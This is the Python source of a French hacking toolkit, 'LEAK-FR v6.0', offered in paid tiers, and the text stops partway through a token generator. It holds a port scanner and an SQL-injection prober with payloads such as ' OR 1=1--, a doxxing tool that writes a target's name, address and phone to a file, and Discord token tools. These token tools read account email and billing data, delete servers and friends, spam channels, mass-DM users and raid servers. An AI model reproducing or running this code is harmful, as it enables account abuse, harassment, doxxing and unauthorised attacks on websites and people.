# -*- coding: utf-8 -*-
# ========================================================================
#   LEAK-FR v6.0  |  By 31300-leak-fr  |  Blood Edition  |  Tiers+
# ========================================================================

import os, sys, json, re, time, socket, random, string, hashlib, platform
import subprocess, base64, shutil as _shutil, threading, urllib.parse
from datetime import datetime

if os.name == 'nt':
    os.system("title /kPfaGZYtK")
    try:
        import ctypes
        ctypes.windll.kernel32.SetConsoleTitleW("/kPfaGZYtK")
        k = ctypes.windll.kernel32
        k.SetConsoleOutputCP(65001)
        k.SetConsoleMode(k.GetStdHandle(-11), 7)
    except Exception: pass
if hasattr(sys.stdout, 'reconfigure'):
    try: sys.stdout.reconfigure(encoding='utf-8')
    except Exception: pass


def _pip(*pkgs):
    for p in pkgs:
        subprocess.run([sys.executable, "-m", "pip", "install", p,
                        "--quiet", "--disable-pip-version-check"], check=False)


try: import requests
except Exception: _pip("requests"); import requests

try:
    from colorama import Fore, Style, init as _ci
    _ci(autoreset=True, strip=False)
except Exception:
    _pip("colorama")
    from colorama import Fore, Style, init as _ci
    _ci(autoreset=True, strip=False)

R = Fore.RED; G = Fore.GREEN; Y = Fore.YELLOW; B = Fore.BLUE; M = Fore.MAGENTA
C = Fore.CYAN; W = Fore.WHITE
DIM = Style.DIM; BRT = Style.BRIGHT; RST = Style.RESET_ALL
OK = f"{G}[+]{RST}"; ERR = f"{R}[x]{RST}"; INF = f"{Y}[~]{RST}"
VERSION = "6.0"

# Tier global + branding custom (maj par _is_activated)
_TIER = "free"
_BRAND = ""           # pseudo AMI affiche dans le banner
_TIER_ORDER = {"free": 0, "vip": 1, "vip+": 2, "ami": 3, "owner": 4}


def _has_tier(required):
    return _TIER_ORDER.get(_TIER, 0) >= _TIER_ORDER.get(required, 0)


# ========================================================================
# BLOOD STYLE LAYER
# ========================================================================
CSI = '\033['
RESET_ANSI = CSI + '0m'
BOLD_ANSI  = CSI + '1m'
DIM_ANSI   = CSI + '2m'


def fg(n): return f'{CSI}38;5;{n}m'


BLOOD_DEEP = fg(52); BLOOD_DARK = fg(88); BLOOD = fg(124)
BLOOD_MID = fg(160); BLOOD_BRIGHT = fg(196); BLOOD_LIGHT = fg(203)
BLOOD_PALE = fg(210); ASH = fg(245); GHOST = fg(238)
GOLD = fg(220); GOLD_DARK = fg(136); AMI_COL = fg(213)
PLUS_COL = fg(51)

CAT_MALWARE = fg(214); CAT_SCAN = fg(196); CAT_PANEL = fg(51); CAT_NETWORK = fg(46)
CAT_MALWARE_DARK = fg(130); CAT_SCAN_DARK = fg(88)
CAT_PANEL_DARK = fg(30); CAT_NETWORK_DARK = fg(28)


def _term_w():
    try: return _shutil.get_terminal_size((120, 40)).columns
    except Exception: return 120


_ANSI_RE = re.compile(r'\033\[[0-9;]*m')
def _vlen(s): return len(_ANSI_RE.sub('', s))
def _pad(s, w):
    n = _vlen(s)
    return s + ' ' * max(0, w - n)


LOGO_LINES = [
    r"██▓    ▓█████  ▄▄▄       ██ ▄█▀     █████▒██▀███  ",
    r"▓██▒    ▓█   ▀ ▒████▄     ██▄█▒     ▓██   ▒▓██ ▒ ██▒",
    r"▒██░    ▒███   ▒██  ▀█▄  ▓███▄░     ▒████ ░▓██ ░▄█ ▒",
    r"▒██░    ▒▓█  ▄ ░██▄▄▄▄██ ▓██ █▄     ░▓█▒  ░▒██▀▀█▄  ",
    r"░██████▒░▒████▒ ▓█   ▓██▒▒██▒ █▄    ░▒█░   ░██▓ ▒██▒",
    r"░ ▒░▓  ░░░ ▒░ ░ ▒▒   ▓▒█░▒ ▒▒ ▓▒     ▒ ░   ░ ▒▓ ░▒▓░",
    r"░ ░ ▒  ░ ░ ░  ░  ▒   ▒▒ ░░ ░▒ ▒░     ░       ░▒ ░ ▒░",
    r"  ░ ░      ░     ░   ▒   ░ ░░ ░      ░ ░     ░░   ░ ",
    r"    ░  ░   ░  ░     ░  ░░  ░                  ░     ",
]
LOGO_W = max(_vlen(l) for l in LOGO_LINES)
SUBTITLE = "made by 31300 leak-fr"
TAGLINE = "──[ L E A K · F R · T O O L ]──"


# ========================================================================
# LOADER
# ========================================================================
LOADER_ON = True
_LOADER_FRAMES = ["▖", "▘", "▝", "▗"]


def _page_loader(text):
    if not LOADER_ON: return
    tw = _term_w()
    label = (text[:26] + "…") if len(text) > 27 else text
    bar_w = 26; steps = 18; duration = 0.32
    for i in range(steps + 1):
        p = i / steps
        filled = int(bar_w * p)
        bar = "█" * filled + "░" * (bar_w - filled)
        line = (f"  {BLOOD_MID}{_LOADER_FRAMES[i % 4]}{RESET_ANSI} "
                f"{BLOOD_PALE}{label:<26}{RESET_ANSI} "
                f"{BLOOD_BRIGHT}[{bar}]{RESET_ANSI} "
                f"{GHOST}{int(p * 100):>3}%{RESET_ANSI}")
        sys.stdout.write("\r" + line); sys.stdout.flush()
        time.sleep(duration / steps)
    sys.stdout.write("\r" + " " * (tw - 1) + "\r"); sys.stdout.flush()


def _loader_steps(title, steps):
    if not LOADER_ON: return
    for s in steps: _page_loader(f"{title} :: {s}")


# ========================================================================
# HELPERS
# ========================================================================
def clr(): os.system("cls" if platform.system() == "Windows" else "clear")
def pause(): input(f"\n{DIM}  [Entrée]{RST} ")


def out(name, content):
    os.makedirs("1-Output", exist_ok=True)
    p = os.path.join("1-Output", name)
    with open(p, "w", encoding="utf-8") as f: f.write(content)
    print(f"\n{OK} Sauvegardé -> {Y}{p}{RST}")


def jget(url, headers=None, timeout=6):
    try: return requests.get(url, headers=headers, timeout=timeout).json()
    except Exception as e: return {"error": str(e)}


def pkv(d, indent=0):
    pad = "   " * indent
    for k, v in (d.items() if isinstance(d, dict) else []):
        if isinstance(v, dict):
            print(f"{pad}{C}{k}{RST}: "); pkv(v, indent + 1)
        else:
            print(f"{pad}{Y}{str(k):<22}{RST} {W}{v}{RST}")


def ask(prompt, default=""):
    v = input(f"  {W}{prompt}{RST} ").strip()
    return v if v else default


def ask_int(prompt, default=0):
    try: return int(ask(prompt, str(default)))
    except Exception: return default


# ========================================================================
# BANNERS
# ========================================================================
def leakfr_banner():
    clr()
    W_ = _term_w()
    for line in LOGO_LINES[:4]:
        pad = max(0, (W_ - LOGO_W) // 2)
        print(" " * pad + BOLD_ANSI + BLOOD_BRIGHT + line + RESET_ANSI)
    for line in LOGO_LINES[4:]:
        pad = max(0, (W_ - LOGO_W) // 2)
        print(" " * pad + BLOOD_DARK + line + RESET_ANSI)
    pad_sub = max(0, (W_ - len(SUBTITLE)) // 2)
    print("")
    print(" " * pad_sub + BOLD_ANSI + BLOOD_LIGHT + SUBTITLE + RESET_ANSI)

    # badge tier + branding AMI
    if _TIER == "owner":
        badge = f" {GOLD}◆ OWNER{ RESET_ANSI }"
    elif _TIER == "ami":
        badge = f" {AMI_COL}◆ AMI{ RESET_ANSI }"
    elif _TIER == "vip+":
        badge = f" {PLUS_COL}◆ VIP+{ RESET_ANSI }"
    elif _TIER == "vip":
        badge = f" {BLOOD_BRIGHT}◆ VIP{ RESET_ANSI }"
    else:
        badge = f" {GHOST}· free{ RESET_ANSI }"
    if _BRAND and _TIER in ("ami", "owner"):
        badge += f"  {AMI_COL}[{_BRAND}]{RESET_ANSI}"
    pad_b = max(0, (W_ - _vlen(badge)) // 2)
    print(" " * pad_b + badge)

    pad_tag = max(0, (W_ - len(TAGLINE)) // 2)
    print(" " * pad_tag + GHOST + TAGLINE + RESET_ANSI)
    print("")


def banner_s(title):
    _page_loader(title)
    leakfr_banner()
    W_ = _term_w()
    bar = "═" * min(60, W_ - 4)
    print(f"  {BLOOD_MID}{bar}{RESET_ANSI}")
    print(f"  {BLOOD_MID}║{RESET_ANSI} {BOLD_ANSI}{BLOOD_LIGHT}{title:<58}{RESET_ANSI} {BLOOD_MID}║{RESET_ANSI}")
    print(f"  {BLOOD_MID}{bar}{RESET_ANSI}\n")


def menu_box(title, opts, color=None):
    _page_loader(title)
    leakfr_banner()
    c_main = color if color else BLOOD_MID
    c_acc  = color if color else BLOOD_BRIGHT
    fill = max(0, 58 - len(title) - 3)
    print(f"  {c_main}┌─[ {BOLD_ANSI}{c_acc}{title}{RESET_ANSI}{c_main} ]{'─' * fill}┐{RESET_ANSI}")
    for n, t in opts:
        arrow = f"{c_acc}▸{RESET_ANSI}" if n != "0" else f"{BLOOD_DARK}◂{RESET_ANSI}"
        item = f" {arrow} {BLOOD_PALE}[{n}]{RESET_ANSI} {W}{t}{RESET_ANSI}"
        vis = 1 + 2 + 1 + len(n) + 2 + 1 + len(t)
        fpad = max(0, 58 - vis)
        print(f"  {c_main}│{RESET_ANSI}{item}" + " " * fpad + f"{c_main}│{RESET_ANSI}")
    print(f"  {c_main}└{'─' * 58}┘{RESET_ANSI}\n")


# ========================================================================
# NETWORK
# ========================================================================
def net_menu():
    while True:
        menu_box("NETWORK SCANNER", [
            ("1", "IP Lookup"), ("2", "Port Scanner"), ("3", "Pinger"),
            ("4", "Website Scanner"), ("5", "SQL Vuln Scanner"),
            ("6", "DNS Lookup"), ("7", "Subdomain Scanner"),
            ("8", "Header Grabber"), ("9", "Traceroute"),
            ("10", "Reverse IP"), ("11", "URL Scanner"),
            ("0", "Retour")])
        c = input(f"  {R}>{RST} ").strip()
        if c == "1": net_ip()
        elif c == "2": net_port()
        elif c == "3": net_ping()
        elif c == "4": net_web()
        elif c == "5": net_sql()
        elif c == "6": net_dns()
        elif c == "7": net_sub()
        elif c == "8": net_headers()
        elif c == "9": net_trace()
        elif c == "10": net_revip()
        elif c == "11": net_url()
        elif c == "0": break


def net_ip():
    banner_s("IP LOOKUP")
    ip = ask("IP:")
    d = jget(f"http://ip-api.com/json/{ip}?fields=66846719")
    print(); pkv(d); pause()


def net_port():
    banner_s("PORT SCANNER")
    host = ask("Host/IP:")
    rng = ask("Range (1-1024 ou 80):", "1-1024")
    try:
        if "-" in rng: p1, p2 = map(int, rng.split("-"))
        else: p1 = p2 = int(rng)
    except Exception: print(f"{ERR} Bad range."); pause(); return
    print(f"\n{INF} Scan {Y}{host}{RST} {p1}-{p2}...\n ")
    op = []
    for port in range(p1, p2 + 1):
        s = socket.socket(); s.settimeout(0.3)
        if s.connect_ex((host, port)) == 0:
            try: svc = socket.getservbyport(port)
            except Exception: svc = "?"
            print(f"  {G}[OPEN]{RST} {port}/tcp {DIM}{svc}{RST}"); op.append(port)
        s.close()
    print(f"\n{OK} {len(op)} ports."); pause()


def net_ping():
    banner_s("PINGER")
    h = ask("Host:")
    param = "-n" if platform.system() == "Windows" else "-c"
    r = subprocess.run(["ping", param, "4", h], capture_output=True, text=True)
    print(r.stdout); pause()


def net_web():
    banner_s("WEBSITE SCANNER")
    url = ask("URL:")
    try:
        r = requests.get(url, timeout=10)
        for k, v in [("Status", r.status_code), ("Server", r.headers.get("Server", "?")),
                     ("Powered", r.headers.get("X-Powered-By", "?")), ("Length", len(r.content))]:
            print(f"  {Y}{k:<10}{RST} {W}{v}{RST}")
    except Exception as e: print(f"{ERR} {e}")
    pause()


def net_sql():
    banner_s("SQL VULN SCANNER")
    url = ask("URL avec param:")
    for pl in ["'", "' OR '1'='1", "' OR 1=1--", "1 UNION SELECT NULL--"]:
        try:
            r = requests.get(url + pl, timeout=5)
            hit = any(e in r.text.lower() for e in ["sql syntax", "mysql_fetch", "syntax error"])
            print(f"  {G if hit else DIM}[{'VULN' if hit else 'SAFE'}]{RST} {pl}")
        except Exception: pass
    pause()


def net_dns():
    banner_s("DNS LOOKUP")
    d = ask("Domain:")
    for rt in ["A", "MX", "NS", "TXT"]:
        try:
            cmd = ["nslookup", f"-type={rt}", d] if platform.system() == "Windows" else ["dig", "+short", rt, d]
            o = subprocess.run(cmd, capture_output=True, text=True, timeout=5).stdout.strip()
            if o: print(f"\n  {Y}{rt}{RST}:\n  {W}{o}{RST}")
        except Exception: pass
    pause()


def net_sub():
    banner_s("SUBDOMAIN SCANNER")
    d = ask("Domain:")
    found = []
    for s in ["www", "mail", "api", "dev", "test", "admin", "cdn", "static", "blog", "shop", "staging"]:
        try:
            ip = socket.gethostbyname(f"{s}.{d}")
            print(f"  {G}[FOUND]{RST} {s}.{d} -> {ip}"); found.append(f"{s}.{d} -> {ip}")
        except Exception: pass
    if found: out(f"subdomains_{d}.txt", "\n".join(found))
    pause()


def net_headers():
    banner_s("HEADER GRABBER")
    url = ask("URL:")
    try:
        r = requests.get(url, timeout=8)
        for k, v in r.headers.items(): print(f"  {Y}{k:<28}{RST} {W}{v}{RST}")
    except Exception as e: print(f"{ERR} {e}")
    pause()


def net_trace():
    banner_s("TRACEROUTE")
    h = ask("Host:")
    cmd = ["tracert", h] if platform.system() == "Windows" else ["traceroute", h]
    try: print(subprocess.run(cmd, capture_output=True, text=True, timeout=30).stdout)
    except Exception as e: print(f"{ERR} {e}")
    pause()


def net_revip():
    banner_s("REVERSE IP")
    ip = ask("IP:")
    try: print(f"\n  {Y}Hostname{RST}: {W}{socket.gethostbyaddr(ip)[0]}{RST}")
    except Exception as e: print(f"{ERR} {e}")
    d = jget(f"http://ip-api.com/json/{ip}"); pkv(d); pause()


def net_url():
    banner_s("URL SCANNER")
    url = ask("URL:")
    try:
        r = requests.get(url, timeout=10)
        links = re.findall(r'href=["\']([^"\']+)["\']', r.text)
        scripts = re.findall(r'src=["\']([^"\']+)["\']', r.text)
        print(f"\n  {Y}Links{RST}: {len(links)}  {Y}Scripts{RST}: {len(scripts)}\n")
        for l in links[:20]: print(f"  {G}->{RST} {DIM}{l[:80]}{RST}")
    except Exception as e: print(f"{ERR} {e}")
    pause()


# ========================================================================
# OSINT
# ========================================================================
def osint_user():
    banner_s("USERNAME TRACKER")
    u = ask("Username:")
    sites = {
        "GitHub": f"https://github.com/{u}", "Twitter": f"https://x.com/{u}",
        "Instagram": f"https://instagram.com/{u}", "TikTok": f"https://tiktok.com/@{u}",
        "Reddit": f"https://reddit.com/user/{u}", "YouTube": f"https://youtube.com/@{u}",
        "Twitch": f"https://twitch.tv/{u}", "Steam": f"https://steamcommunity.com/id/{u}",
        "Roblox": f"https://roblox.com/user.aspx?username={u}",
        "Telegram": f"https://t.me/{u}", "Pinterest": f"https://pinterest.com/{u}",
        "SoundCloud": f"https://soundcloud.com/{u}", "Medium": f"https://medium.com/@{u}",
        "Snapchat": f"https://snapchat.com/add/{u}", "Keybase": f"https://keybase.io/{u}",
    }
    nf = ["not found", "404", "doesn't exist", "no user", "page not found"]
    hdrs = {"User-Agent": "Mozilla/5.0"}
    import concurrent.futures
    print(f"\n{INF} Check {len(sites)} sites...\n ")

    def ck(n, url):
        try:
            r = requests.get(url, timeout=6, headers=hdrs, allow_redirects=True)
            return (r.status_code == 200 and not any(x in r.text.lower()[:2048] for x in nf), n, url)
        except Exception: return (False, n, url)

    found = []
    with concurrent.futures.ThreadPoolExecutor(max_workers=15) as ex:
        for ok_, n, url in ex.map(lambda x: ck(*x), sites.items()):
            if ok_: print(f"  {G}[FOUND]{RST} {n:<14} {Y}{url}{RST}"); found.append(f"{n}: {url}")
    if found: out(f"username_{u}.txt", "\n".join(found))
    pause()


def osint_email():
    banner_s("EMAIL OSINT")
    e = ask("Email:").lower()
    gh = hashlib.md5(e.encode()).hexdigest()
    print(f"\n  {Y}Gravatar{RST}: https://gravatar.com/avatar/{gh}")
    print(f"  {Y}HIBP    {RST}: https://haveibeenpwned.com/account/{e}")
    print(f"  {Y}Dehashed{RST}: https://dehashed.com/search?query={e}")
    print(f"  {Y}IntelX  {RST}: https://intelx.io/?s={e}")
    print(f"  {Y}Hunter  {RST}: https://hunter.io/email-verifier/{e}")
    pause()


def osint_phone():
    banner_s("PHONE OSINT")
    num = re.sub(r'[\s\-.()]', '', ask("Numero (+cc):"))
    if not num.startswith("+"): num = "+" + num
    print(f"\n  {Y}Numero{RST}: {num}")
    print(f"  {G}[Google]{RST} https://google.com/search?q=%22{num}%22")
    print(f"  {G}[Truecaller]{RST} https://truecaller.com/search/fr/{num[1:]}")
    print(f"  {G}[Telegram]{RST} https://t.me/{num[1:]}")
    print(f"  {G}[WhatsApp]{RST} https://wa.me/{num[1:]}")
    print(f"  {G}[Sync.ME]{RST} https://sync.me/?q={num[1:]}")
    pause()


def osint_dork():
    banner_s("GOOGLE DORKING")
    t = ask("Target:")
    for d in [f'site:{t}', f'site:{t} filetype:pdf', f'site:{t} intitle:"index of"',
              f'site:{t} inurl:admin', f'site:{t} filetype:env', f'site:{t} inurl:backup',
              f'site:{t} intext:"password"', f'site:{t} ext:sql', f'site:{t} inurl:login']:
        print(f"  {G}->{RST} {DIM}{d}{RST}")
    pause()


def osint_exif():
    banner_s("IMAGE EXIF")
    try:
        from PIL import Image; from PIL.ExifTags import TAGS
    except Exception:
        _pip("Pillow"); from PIL import Image; from PIL.ExifTags import TAGS
    p = ask("Image path:")
    try:
        img = Image.open(p); exif = img.getexif()
        if not exif: print(f"{INF} No EXIF.")
        else:
            for tid, val in exif.items():
                print(f"  {Y}{str(TAGS.get(tid, tid)):<28}{RST} {W}{val}{RST}")
    except Exception as e: print(f"{ERR} {e}")
    pause()


def osint_dox():
    banner_s("D0X CREATE")
    fields = [("full_name", "Nom"), ("alias", "Alias"), ("dob", "DOB"),
              ("phone", "Tel"), ("email", "Email"), ("address", "Adresse"),
              ("city", "Ville"), ("country", "Pays"), ("discord", "Discord"),
              ("instagram", "Insta"), ("twitter", "Twitter"), ("notes", "Notes")]
    d = {}
    for k, l in fields:
        v = ask(f"{l:<10}:")
        if v: d[k] = v
    if not d: print(f"{ERR} Vide."); pause(); return
    target = d.get("full_name", d.get("alias", "target"))
    lines = [f"{'='*50}", f"  D0X -- {target.upper()}", f"{'='*50}", ""]
    for k, v in d.items(): lines.append(f"  {k.upper():<12}: {v}")
    print(f"\n" + "\n".join(lines))
    out(f"dox_{target}.txt", "\n".join(lines))
    pause()


def osint_dox_tr():
    banner_s("D0X TRACKER")
    t = ask("Target:")
    for s in [f"https://google.com/search?q={t}",
              f"https://google.com/search?q={t}+discord",
              f"https://google.com/search?q={t}+instagram",
              f"https://google.com/search?q=site:pastebin.com+{t}",
              f"https://twitter.com/search?q={t}",
              f"https://tiktok.com/search?q={t}"]:
        print(f"  {G}->{RST} {DIM}{s}{RST}")
    pause()


def osint_insta():
    banner_s("INSTAGRAM OSINT")
    u = ask("Username:").lstrip("@")
    hdrs = {"User-Agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 16_0 like Mac OS X) AppleWebKit/605.1.15"}
    try:
        r = requests.get(f"https://instagram.com/{u}/?__a=1&__d=dis", headers=hdrs, timeout=8)
        for k, pat in {"followers": r'"edge_followed_by":\{"count":(\d+)',
                       "name": r'"full_name":"([^"]*)"',
                       "bio": r'"biography":"([^"]*)"',
                       "private": r'"is_private":(true|false)',
                       "verified": r'"is_verified":(true|false)'}.items():
            m = re.search(pat, r.text)
            if m: print(f"  {Y}{k:<10}{RST} {W}{m.group(1)[:80]}{RST}")
    except Exception as e: print(f"{ERR} {e}")
    pause()


def osint_tiktok():
    banner_s("TIKTOK OSINT")
    u = ask("Username:").lstrip("@")
    hdrs = {"User-Agent": "Mozilla/5.0"}
    try:
        r = requests.get(f"https://tiktok.com/@{u}", headers=hdrs, timeout=10)
        for k, pat in {"Followers": r'"followerCount":(\d+)',
                       "Following": r'"followingCount":(\d+)',
                       "Likes": r'"heartCount":(\d+)',
                       "Videos": r'"videoCount":(\d+)',
                       "Nickname": r'"nickname":"([^"]+)"',
                       "Bio": r'"signature":"([^"]*)"',
                       "Region": r'"region":"([^"]+)"'}.items():
            m = re.search(pat, r.text)
            if m: print(f"  {Y}{k:<10}{RST} {W}{m.group(1)[:80]}{RST}")
    except Exception as e: print(f"{ERR} {e}")
    pause()


def osint_snap():
    banner_s("SNAPCHAT OSINT")
    u = ask("Username:").lstrip("@")
    hdrs = {"User-Agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 16_0 like Mac OS X)"}
    try:
        r = requests.get(f"https://snapchat.com/add/{u}", headers=hdrs, timeout=8)
        for k, pat in {"display": r'"display_name":"([^"]+)"',
                       "score": r'"snap_score":(\d+)',
                       "subs": r'"subscriber_count":(\d+)',
                       "bio": r'"bio":"([^"]*)"',
                       "location": r'"location":"([^"]+)"'}.items():
            m = re.search(pat, r.text)
            if m: print(f"  {Y}{k:<10}{RST} {W}{m.group(1)[:80]}{RST}")
    except Exception as e: print(f"{ERR} {e}")
    pause()


def osint_tw():
    banner_s("TWITTER/X OSINT")
    u = ask("Username:").lstrip("@")
    try:
        r = requests.get(f"https://nitter.privacydev.net/{u}", timeout=8)
        for k, pat in {"Name": r'<a class="profile-card-fullname"[^>]*>([^<]+)<',
                       "Bio": r'<div class="profile-bio"[^>]*><p>([^<]+)<',
                       "Location": r'<div class="profile-location"[^>]*>.*?<span>([^<]+)<'}.items():
            m = re.search(pat, r.text, re.DOTALL)
            if m: print(f"  {Y}{k:<10}{RST} {W}{m.group(1).strip()[:80]}{RST}")
    except Exception as e: print(f"{ERR} {e}")
    pause()


def osint_face():
    banner_s("FACE RECON")
    url = ask("Image URL:")
    if not url.startswith("http"): print(f"{ERR} URL requise."); pause(); return
    import urllib.parse as up
    for n, l in [("Google Lens", f"https://lens.google.com/uploadbyurl?url={up.quote(url)}"),
                 ("Yandex", f"https://yandex.com/images/search?rpt=imageview&url={up.quote(url)}"),
                 ("Bing Visual", f"https://bing.com/images/search?q=imgurl:{up.quote(url)}"),
                 ("TinEye", f"https://tineye.com/search?url={up.quote(url)}"),
                 ("FaceCheck", f"https://facecheck.id/#?url={up.quote(url)}")]:
        print(f"  {G}[{n}]{RST} {DIM}{l[:90]}{RST}")
    pause()


def osint_steam():
    banner_s("STEAM ID CONVERTER")
    raw = ask("SteamID64:")
    try:
        if raw.isdigit() and len(raw) == 17:
            sid64 = int(raw); sid32 = sid64 - 76561197960265728
            print(f"\n  {Y}SteamID64{RST}: {sid64}")
            print(f"  {Y}SteamID  {RST}: STEAM_0:{sid32 % 2}:{sid32 // 2}")
            print(f"  {Y}SteamID3 {RST}: [U:1:{sid32}]")
            print(f"  {Y}Profile  {RST}: https://steamcommunity.com/profiles/{sid64}")
    except Exception as e: print(f"{ERR} {e}")
    pause()


def osint_shodan():
    banner_s("SHODAN DORKING")
    t = ask("Target:")
    for d in [f"https://shodan.io/search?query=hostname%3A{t}",
              f"https://shodan.io/search?query=ip%3A{t}",
              f"https://shodan.io/search?query=org%3A{t}",
              f"https://shodan.io/host/{t}",
              f"https://censys.io/ipv4/{t}"]:
        print(f"  {G}->{RST} {DIM}{d}{RST}")
    pause()


def osint_whois():
    banner_s("WHOIS LOOKUP")
    d = ask("Domain:")
    try:
        import whois as w
        data = w.whois(d)
        print(f"  {Y}Registrar{RST}: {data.registrar}")
        print(f"  {Y}Created  {RST}: {data.creation_date}")
        print(f"  {Y}Expires  {RST}: {data.expiration_date}")
        print(f"  {Y}NS       {RST}: {data.name_servers}")
    except ImportError:
        _pip("python-whois"); print(f"{INF} Relance.")
    except Exception as e: print(f"{ERR} {e}")
    pause()


def osint_menu():
    while True:
        menu_box("OSINT", [
            ("1", "Username Tracker"), ("2", "Email OSINT"),
            ("3", "Phone OSINT"), ("4", "Google Dorking"),
            ("5", "Image EXIF"), ("6", "D0x Create"),
            ("7", "D0x Tracker"), ("8", "Instagram OSINT"),
            ("9", "TikTok OSINT"), ("10", "Snapchat OSINT"),
            ("11", "Twitter/X OSINT"), ("12", "Face Recon"),
            ("13", "Steam ID"), ("14", "Shodan Dorking"),
            ("15", "WHOIS Lookup"),
            ("0", "Retour")])
        c = input(f"  {R}>{RST} ").strip()
        if c == "1": osint_user()
        elif c == "2": osint_email()
        elif c == "3": osint_phone()
        elif c == "4": osint_dork()
        elif c == "5": osint_exif()
        elif c == "6": osint_dox()
        elif c == "7": osint_dox_tr()
        elif c == "8": osint_insta()
        elif c == "9": osint_tiktok()
        elif c == "10": osint_snap()
        elif c == "11": osint_tw()
        elif c == "12": osint_face()
        elif c == "13": osint_steam()
        elif c == "14": osint_shodan()
        elif c == "15": osint_whois()
        elif c == "0": break


# ========================================================================
# DISCORD
# ========================================================================
def _dh(t):
    return {"Authorization": t, "Content-Type": "application/json",
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"}


def dc_info():
    banner_s("TOKEN INFO")
    t = ask("Token:")
    r = requests.get("https://discord.com/api/v9/users/@me", headers=_dh(t))
    if r.status_code != 200: print(f"{ERR} Invalide."); pause(); return
    d = r.json()
    gs = requests.get("https://discord.com/api/v9/users/@me/guilds", headers=_dh(t)).json()
    bl = requests.get("https://discord.com/api/v9/users/@me/billing/payment-sources", headers=_dh(t)).json()
    for k, v in [("ID", d.get("id")), ("Username", d.get("username")),
                 ("Email", d.get("email")), ("Phone", d.get("phone")),
                 ("Nitro", d.get("premium_type")), ("MFA", d.get("mfa_enabled")),
                 ("Guilds", len(gs) if isinstance(gs, list) else 0),
                 ("Billing", len(bl) if isinstance(bl, list) else 0)]:
        print(f"  {Y}{k:<10}{RST} {W}{v}{RST}")
    pause()


def dc_nuker():
    banner_s("TOKEN NUKER")
    t = ask("Token:"); h = _dh(t)
    if ask("Type NUKE:") != "NUKE": pause(); return
    gs = requests.get("https://discord.com/api/v9/users/@me/guilds", headers=h).json()
    if isinstance(gs, list):
        for g in gs:
            ep = f"guilds/{g['id']}" if g.get("owner") else f"users/@me/guilds/{g['id']}"
            r = requests.delete(f"https://discord.com/api/v9/{ep}", headers=h)
            print(f"  {Y}[{r.status_code}]{RST} {g['name']}")
            time.sleep(0.3)
    fs = requests.get("https://discord.com/api/v9/users/@me/relationships", headers=h).json()
    if isinstance(fs, list):
        for f in fs:
            requests.delete(f"https://discord.com/api/v9/users/@me/relationships/{f['id']}", headers=h)
            time.sleep(0.2)
    print(f"\n{OK} Nuke done."); pause()


def dc_spam():
    banner_s("TOKEN SPAMMER")
    t = ask("Token:"); ch = ask("Channel ID:"); m = ask("Message:")
    n = ask_int("Count:", 10); d = float(ask("Delay:", "0.5"))
    h = _dh(t)
    for i in range(1, n + 1):
        r = requests.post(f"https://discord.com/api/v9/channels/{ch}/messages", headers=h, json={"content": m})
        print(f"  {G if r.status_code == 200 else R}[{i}/{n}]{RST} {r.status_code}")
        time.sleep(d)
    pause()


def dc_join():
    banner_s("TOKEN JOINER")
    t = ask("Token:"); inv = ask("Invite:").split("/")[-1]
    r = requests.post(f"https://discord.com/api/v9/invites/{inv}", headers=_dh(t), json={})
    print(f"{OK if r.status_code == 200 else ERR} {r.status_code}"); pause()


def dc_leave():
    banner_s("TOKEN LEAVER")
    t = ask("Token:"); g = ask("Server ID:")
    r = requests.delete(f"https://discord.com/api/v9/users/@me/guilds/{g}", headers=_dh(t))
    print(f"{OK if r.status_code == 204 else ERR} {r.status_code}"); pause()


def dc_status():
    banner_s("STATUS CHANGER")
    t = ask("Token:")
    s = ask("[1]online [2]idle [3]dnd [4]invisible:", "1")
    smap = {"1": "online", "2": "idle", "3": "dnd", "4": "invisible"}
    c = ask("Custom text:", "")
    p = {"status": smap.get(s, "online")}
    if c: p["custom_status"] = {"text": c}
    r = requests.patch("https://discord.com/api/v9/users/@me/settings", headers=_dh(t), json=p)
    print(f"{OK if r.status_code == 200 else ERR} {r.status_code}"); pause()


def dc_delf():
    banner_s("DELETE FRIENDS")
    t = ask("Token:"); h = _dh(t)
    if ask("Type CONFIRM:") != "CONFIRM": pause(); return
    fs = requests.get("https://discord.com/api/v9/users/@me/relationships", headers=h).json()
    if isinstance(fs, list):
        for f in fs:
            requests.delete(f"https://discord.com/api/v9/users/@me/relationships/{f['id']}", headers=h)
            print(f"  {R}[DEL]{RST} {f.get('user',{}).get('username','?')}")
            time.sleep(0.3)
    pause()


def dc_blockf():
    banner_s("BLOCK FRIENDS")
    t = ask("Token:"); h = _dh(t)
    fs = requests.get("https://discord.com/api/v9/users/@me/relationships", headers=h).json()
    if isinstance(fs, list):
        for f in fs:
            if f.get("type") == 1:
                requests.put(f"https://discord.com/api/v9/users/@me/relationships/{f['user']['id']}",
                             headers=h, json={"type": 2})
                print(f"  {R}[BLOCK]{RST} {f['user']['username']}")
                time.sleep(0.3)
    pause()


def dc_mass_dm():
    banner_s("MASS DM")
    t = ask("Token:"); m = ask("Message:"); ids = ask("User IDs (comma):").split(",")
    h = _dh(t)
    for uid in ids:
        uid = uid.strip()
        if not uid: continue
        dm = requests.post("https://discord.com/api/v9/users/@me/channels",
                           headers=h, json={"recipient_id": uid})
        if dm.status_code == 200:
            cid = dm.json()["id"]
            r = requests.post(f"https://discord.com/api/v9/channels/{cid}/messages",
                              headers=h, json={"content": m})
            print(f"  {G if r.status_code == 200 else R}[{uid}]{RST} {r.status_code}")
        time.sleep(0.6)
    pause()


def dc_del_dm():
    banner_s("DELETE DMs")
    t = ask("Token:"); h = _dh(t)
    dms = requests.get("https://discord.com/api/v9/users/@me/channels", headers=h).json()
    if isinstance(dms, list):
        for dm in dms:
            requests.delete(f"https://discord.com/api/v9/channels/{dm['id']}", headers=h)
            print(f"  {R}[DEL]{RST} {dm['id']}")
            time.sleep(0.3)
    pause()


def dc_raid():
    banner_s("SERVER RAID")
    t = ask("Token:"); g = ask("Server ID:"); ch = ask("Channel ID:")
    m = ask("Message:"); n = ask_int("Count:", 20)
    h = _dh(t)
    for i in range(3):
        requests.post(f"https://discord.com/api/v9/guilds/{g}/channels",
                      headers=h, json={"name": f"raided-{i}", "type": 0})
    for i in range(1, n + 1):
        r = requests.post(f"https://discord.com/api/v9/channels/{ch}/messages",
                          headers=h, json={"content": f"@everyone {m}"})
        print(f"  {G if r.status_code == 200 else R}[{i}/{n}]{RST}")
        time.sleep(0.3)
    pause()


def dc_tokgen():
    banner_s("TOKEN GENERATOR")
    n = ask_int("Count:", 10)
    chars = string.ascii_letters + string.digits + "-_"
